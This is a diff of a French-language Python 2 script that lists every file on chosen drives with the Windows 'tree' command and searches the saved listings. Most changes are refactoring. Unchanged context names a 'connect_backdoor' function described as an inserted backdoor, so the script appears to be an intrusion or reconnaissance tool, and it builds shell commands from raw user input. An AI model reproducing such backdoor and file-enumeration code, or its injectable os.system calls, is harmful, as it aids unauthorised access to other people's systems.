@@ -24,9 +24,7 @@ def pic():
 """ Program en entier """
 def normal():
 	print("Program run [normal mod]\n")
-	a = 1
-	
-	while(a == 1):
+	while(1):
 		OS = int(input("Choisissez votre systeme: {1. linux |2. windows |0. exit}\n>>> "))
 		
 		if(OS == 1 or OS == 2):
@@ -49,12 +47,15 @@ def normal():
 				lecteur = raw_input("Choisissez un lecteur: {A |B |C |... |tous}\n>>> ")
 				
 				if(lecteur in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
-					files = 'tree /a /f ' + lecteur + ':\\ > ' + save + "-" + lecteur + '.txt'
+					output = save + "-" + lecteur + '.txt'
+					files = 'tree /a /f ' + lecteur + ':\\ > ' + output
 					
 					print("\n> Command[" + system + "]: " + files)
 					print("Loading...")
 					
+					os.system('md ' + save)
 					os.system(files)
+					os.system('move ' + output + ' ' + save)
 					print("Successfull Scan on [" + save + "].\n")
 				
 				elif(lecteur == "tous"):
@@ -119,14 +120,13 @@ def normal():
 					
 					print("\nSuccessfull Scan on [" + save + "].\n")
 			
-			a = 0
+			break
 		
 		elif(OS == 0):
 			print("Quitting...\n")
-			exit(1)
+			break
 		
-		else:
-			print("[ERROR] - Sorry this os isn't include on program...\n")
+		else: print("[ERROR] - Sorry this os isn't include on program...\n")
 		
 	answer = int(input("Scan the tree ? (1/0): "))
 	
@@ -138,13 +138,11 @@ def normal():
 		save = open(save)
 		
 		for line in save:
-			if(chaine in line):
-				print("> Result: " + line)
+			if(chaine in line): print("> Result: " + line)
 		
 		save.close()
 	
-	elif(answer == 0):
-		print("Quitting...\n")
+	elif(answer == 0): print("Quitting...\n")
 
 """ Fabrication de l'arborescence """
 def make_tree():
@@ -171,12 +169,15 @@ def make_tree():
 			lecteur = raw_input("Choisissez un lecteur: {A |B |C |... |tous}\n>>> ")
 			
 			if(lecteur in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
-				files = 'tree /a /f ' + lecteur + ':\\ > ' + save + "-" + lecteur + '.txt'
+				output = save + "-" + lecteur + '.txt'
+				files = 'tree /a /f ' + lecteur + ':\\ > ' + output
 				
 				print("\n> Command[" + system + "]: " + files)
 				print("Loading...")
 				
+				os.system('md ' + save)
 				os.system(files)
+				os.system('move ' + output + ' ' + save)
 				print("Successfull Scan on [" + files + "].\n")
 			
 			elif(lecteur == "tous"):
@@ -240,15 +241,12 @@ def make_tree():
 				os.system('move ' + save + '-Z.txt ' + save)
 				
 				print("\nSuccessfull Scan on [" + save + "].\n")
-		
-		a = 0
 	
 	elif(OS == 0):
 		print("Quitting...\n")
 		exit(1)
 	
-	else:
-		print("[ERROR] - Sorry this os isn't include on program...\n")
+	else: print("[ERROR] - Sorry this os isn't include on program...\n")
 
 """ Scan de l'arborescence """
 def scan_tree():
@@ -256,31 +254,23 @@ def scan_tree():
 	files = os.listdir("./")
 	print("./")
 	
-	for file in files:
-		print("+-> " + file)
-	
-	c = 1
-	
-	while c == 1:
+	for file in files: print("+-> " + file)
+	while(1):
 		save = raw_input("\nNom du fichier: ")
 		disk = raw_input("[null for Linux]Disque: ")
 		
-		if(disk not in "null"):
-			save = "tree_" + save + "/tree_" + save + "-" + disk + '.txt'
-		
-		if(disk in "null"):
-			save = "./tree_" + save + '.txt'
+		if(disk not in "null"): save = "tree_" + save + "/tree_" + save + "-" + disk + '.txt'
+		if(disk in "null"): save = "./tree_" + save + '.txt'
 		
 		chaine = raw_input("Tapez une chaine a rechercher: ")
 		print("\n")
 		save = open(save)
 		
 		for line in save:
-			if(chaine in line):
-				print("> Result: " + line)
+			if(chaine in line): print("> Result: " + line)
 		
 		save.close()
-		c = 0
+		break
 
 """ Le backdoor que t'as créer et que j'ai insérer """
 def connect_backdoor():
@@ -368,8 +358,7 @@ def subprogram():
 		
 		print("[INFO] - Ecriture Terminer\n")
 	
-	if(code == 0):
-		print("\n[INFO] - Not Ready\n")
+	if(code == 0): print("\n[INFO] - Not Ready\n")
 
 """ Mode d'éxecution du program """
 def program():
